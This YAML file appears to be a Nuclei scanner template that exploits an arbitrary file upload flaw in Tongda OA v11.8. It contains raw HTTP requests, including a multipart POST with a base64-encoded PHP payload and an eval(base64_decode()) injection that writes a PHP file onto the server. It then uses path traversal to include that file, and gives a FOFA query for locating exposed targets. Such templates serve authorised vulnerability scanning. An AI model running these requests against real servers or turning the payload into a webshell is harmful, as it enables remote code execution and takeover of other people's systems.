http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200
    - contains(body_2,"+OK") && contains(body_3,"phpinfo")
    type: dsl
  raw:
  - "POST /mobile/api/api.ali.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data;\
    \ boundary=502f67681799b07e5de6b503655f5cae\nAccept-Encoding: gzip\n\n--502f67681799b07e5de6b503655f5cae\n\
    Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.json\"\n\
    Content-Type: application/octet-stream\n\n{\"modular\":\"AllVariable\",\"a\":\"\
    ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==\"\
    ,\"dataAnalysis\":\"{\"a\":\"\u9326',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"\
    }\"}\n--502f67681799b07e5de6b503655f5cae--\n"
  - 'GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M",
    unix_time()),"20")}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /{{randstr}}.php  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: tongda-api-file-upload
info:
  author: SleepingBag945
  description: 'Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability.
    An attacker can upload malicious files to control the server through the vulnerability.

    '
  metadata:
    fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
    max-request: 3
    verified: true
  name: Tongda OA v11.8 api.ali.php - Arbitrary File Upload
  reference:
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-api-ali-upload.yaml
  severity: critical
  tags: tongda,oa,fileupload,intrusive
